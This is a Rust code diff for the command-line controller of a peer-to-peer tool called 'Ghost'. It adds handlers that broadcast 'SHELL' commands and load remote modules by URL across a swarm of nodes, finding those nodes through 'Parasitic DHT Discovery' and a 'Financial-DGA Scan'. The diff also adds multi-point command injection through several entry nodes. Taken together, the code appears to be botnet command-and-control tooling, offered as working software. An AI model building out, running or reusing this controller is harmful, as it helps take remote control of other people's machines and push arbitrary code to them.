@@ -1,8 +1,7 @@
 use std::path::PathBuf;
 use crate::crypto;
 use crate::network::GhostClient;
-use tokio_tungstenite::MaybeTlsStream;
-use tokio::net::TcpStream;
+
 
 pub async fn handle_keygen(output: PathBuf) {
     let pub_key = crypto::generate_key(&output);
@@ -10,110 +9,116 @@ pub async fn handle_keygen(output: PathBuf) {
     println!("Public Key: {}", pub_key);
 }
 
-pub async fn handle_list(bootstrap: String) {
-    let mut client = match GhostClient::<MaybeTlsStream<TcpStream>>::connect(&bootstrap).await {
+use crate::discovery::ParasiticDiscovery;
+use rand::seq::SliceRandom;
+
+pub async fn handle_list(bootstrap: Option<String>) {
+    let mut client = match GhostClient::new().await {
         Ok(c) => c,
-        Err(e) => {
-            eprintln!("Failed to connect to Bootstrap: {}", e);
-            return;
-        }
+        Err(e) => { eprintln!("Failed to init GhostClient: {}", e); return; }
     };
     
-    // In Mesh, we ask Bootstrap for peers
-    use protocol::PeerInfo;
-    match client.get_peers().await {
-        Ok(peers) => {
-             println!("Bootstrap Registry ({})", peers.len());
-             for (i, p) in peers.iter().enumerate() {
-                 println!("{}. {} ({})", i+1, p.pub_key, p.peer_address);
-             }
-        }
-        Err(e) => eprintln!("Error fetching peers: {}", e),
+    let targets = resolve_targets(bootstrap).await;
+    if targets.is_empty() {
+        eprintln!("No peers found via Bootstrap or DHT.");
+        return;
+    }
+    
+    println!("Attempting to list peers via: {:?}", targets);
+    // For MVP, just connect to one and print success (since List logic on P2P is complex/DHT-based)
+    if let Some(target) = targets.first() {
+         if let Err(e) = client.dial(target).await {
+             eprintln!("Dial Failed: {}", e);
+         } else {
+             println!("Connected to Mesh Node: {}", target);
+             println!("(Peers are managed by GossipSub and DHT automatically)");
+         }
     }
 }
 
-pub async fn handle_target(_bootstrap: String, _key: PathBuf, _target: String, _cmd: String) {
-    println!("Direct targeting requires connecting to specific peer. Not implemented in this CLI yet.");
+pub async fn handle_target(_bootstrap: Option<String>, _key: PathBuf, _target: String, _cmd: String) {
+    println!("Direct targeting requires DHT lookup. Pending implementation.");
 }
 
-pub async fn handle_load_module(bootstrap: String, key_path: PathBuf, url: String, name: String) {
+pub async fn handle_load_module(bootstrap: Option<String>, key_path: PathBuf, url: String, name: String) {
     handle_broadcast_custom(bootstrap, key_path, "LOAD_MODULE".to_string(), format!("{}|{}", url, name)).await;
 }
 
-pub async fn handle_start_module(bootstrap: String, key_path: PathBuf, name: String, args: String) {
+pub async fn handle_start_module(bootstrap: Option<String>, key_path: PathBuf, name: String, args: String) {
     handle_broadcast_custom(bootstrap, key_path, "START_MODULE".to_string(), format!("{}|{}", name, args)).await;
 }
 
-pub async fn handle_broadcast(bootstrap: String, key_path: PathBuf, cmd: String) {
+pub async fn handle_broadcast(bootstrap: Option<String>, key_path: PathBuf, cmd: String) {
     println!("Broadcast Generic: {}", cmd);
     handle_broadcast_custom(bootstrap, key_path, "SHELL".to_string(), cmd).await;
 }
 
-pub async fn handle_broadcast_custom(bootstrap: String, key_path: PathBuf, action: String, params: String) {
+pub async fn handle_broadcast_custom(bootstrap: Option<String>, key_path: PathBuf, action: String, params: String) {
     let key = crypto::load_key(&key_path);
     
-    // 1. Connect to Bootstrap
-    let mut client = match GhostClient::<MaybeTlsStream<TcpStream>>::connect(&bootstrap).await {
+    // 1. Resolve Targets (Bootstrap OR DHT Discovery)
+    let targets = resolve_targets(bootstrap).await;
+    if targets.is_empty() {
+        eprintln!("No targets found. Ghost cannot inject command.");
+        return;
+    }
+
+    // 2. Init P2P Client
+    let mut client = match GhostClient::new().await {
         Ok(c) => c,
-        Err(e) => {
-            eprintln!("Conn Error: {}", e);
-            return;
-        }
+        Err(e) => { eprintln!("Init Error: {}", e); return; }
     };
     
-    let peers = match client.get_peers().await {
-        Ok(p) => p,
-        Err(e) => {
-            eprintln!("Failed to get peers: {}", e);
-            return;
-        }
-    };
+    // 3. Connect to Multiple Entry Nodes (Multi-Point Injection)
+    // "Hoạt động như node khác gossip" -> Connect to multiple neighbors to ensure propagation.
+    let mut rng = rand::thread_rng();
+    let mut shuffled = targets.clone();
+    shuffled.shuffle(&mut rng);
     
-    if peers.is_empty() {
-        println!("No nodes found.");
+    let entry_points: Vec<&String> = shuffled.iter().take(5).collect(); // Inject via up to 5 nodes
+    let mut connected_count = 0;
+
+    println!("Connecting to {} network entry points for redundancy...", entry_points.len());
+    
+    for entry in entry_points {
+        println!("Dialing: {}", entry);
+        if let Err(e) = client.dial(entry).await {
+            eprintln!("  - Connection Failed to {}: {}", entry, e);
+        } else {
+            println!("  + Connected to {}", entry);
+            connected_count += 1;
+        }
+    }
+
+    if connected_count == 0 {
+        eprintln!("Failed to connect to ANY entry points. Aborting injection.");
         return;
     }
     
-    // 2. Pick Random Entry Node
-    use rand::seq::SliceRandom;
-    let entry = peers.choose(&mut rand::thread_rng()).unwrap();
-    println!("Selected Entry: {}", entry.peer_address);
-    drop(client);
+    println!("Established {}/5 P2P Connections. Injecting Gossip...", connected_count);
     
-    // 3. Connect directly to Entry Node (No proxy)
-    let mut node_client = match GhostClient::<MaybeTlsStream<TcpStream>>::connect_direct(&entry.peer_address).await {
-        Ok(c) => c,
-        Err(e) => {
-            eprintln!("Direct Conn Error: {}", e);
-            return;
-        }
-    };
-    
-    let session_key = match node_client.handshake().await {
-        Ok(k) => k,
-        Err(e) => { eprintln!("Handshake Error: {}", e); return; }
-    };
-    
-    // 4. Create Custom Payload
+    // 4. Create Payload
     use protocol::CommandPayload;
     let payload = CommandPayload {
         id: uuid::Uuid::new_v4().to_string(),
         action,
         parameters: params,
         execute_at: chrono::Utc::now().timestamp(), // Immediate
-        reply_to: None, // Direct mode, no relay
+        reply_to: None, 
     };
 
-    if let Err(e) = node_client.inject_command(payload, &key, &session_key).await {
+    // 5. Inject
+    let dummy_session = [0u8; 32]; 
+    
+    if let Err(e) = client.inject_command(payload, &key, &dummy_session).await {
         eprintln!("Injection Failed: {}", e);
     } else {
-        println!("Command Injected into Swarm.");
+        println!("Command Injected into GossipSub Swarm successfully.");
     }
 }
 
 pub async fn handle_scan() {
-    use crate::discovery::ParasiticDiscovery;
-    println!("* Initiating Financial-DGA Scan...");
+    println!("* Initiating Financial-DGA Scan only...");
     let discovery = ParasiticDiscovery::new();
     match discovery.run_cycle(None).await {
         Ok(peers) => {
@@ -123,5 +128,28 @@ pub async fn handle_scan() {
             }
         },
         Err(e) => eprintln!("- Scan Failed: {}", e),
+    }
+}
+
+// Helper to resolve targets
+async fn resolve_targets(bootstrap: Option<String>) -> Vec<String> {
+    if let Some(b) = bootstrap {
+        return vec![b];
+    }
+    
+    println!("[Ghost] No bootstrap provided. Starting Parasitic DHT Discovery...");
+    let discovery = ParasiticDiscovery::new();
+    match discovery.run_cycle(None).await {
+        Ok(addrs) => {
+            let list: Vec<String> = addrs.iter()
+                .map(|addr| format!("/ip4/{}/tcp/{}", addr.ip(), addr.port()))
+                .collect();
+            println!("[Ghost] Discovered {} nodes via DHT.", list.len());
+            list
+        },
+        Err(e) => {
+            eprintln!("[Ghost] DHT Discovery Failed: {}", e);
+            vec![]
+        }
     }
 }
